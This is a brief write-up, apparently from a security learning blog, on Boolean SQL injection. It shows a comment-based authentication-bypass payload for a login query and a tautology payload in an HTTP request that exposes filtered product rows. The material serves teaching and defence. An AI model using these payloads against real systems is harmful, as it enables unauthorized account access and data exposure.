---
title: "Research: Boolean & Logic-Based SQL Injection"
date: 2025-11-27
draft: false
description: "Bypassing authentication and retrieving hidden schema data using tautologies."
tags: ["Web Security", "SQLi", "Databases"]
---

## 1. Authentication Bypass via Comment Injection
Login mechanisms frequently construct queries by concatenating user input directly into a string.

**Backend Logic:**
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

**Injection Vector:**
By appending the SQL comment sequence (`--`), we can truncate the query immediately after the username, effectively removing the password validation requirement.

**Payload:** `administrator'--`

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
```
The database engine interprets this as a valid query for the user "administrator", ignoring the remainder of the string.

## 2. Boolean Inference (Hidden Data Retrieval)
Applications often use hidden flags (e.g., `released = 1`) to filter content. We can override these filters using Boolean tautologies.

**Target Request:**
```http
GET /filter?category=Pets HTTP/2
```

**Backend Query:**
```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1
```

**Injection Payload:**
```http
GET /filter?category=Pets'+OR+1=1--' HTTP/2
```

**Execution Logic:**
```sql
SELECT * FROM products WHERE category = 'Pets' OR 1=1--' AND released = 1
```
Since `1=1` evaluates to TRUE for every row in the table, the database returns the entire dataset, including unreleased or internal items. This technique effectively dumps the table without requiring a UNION attack.
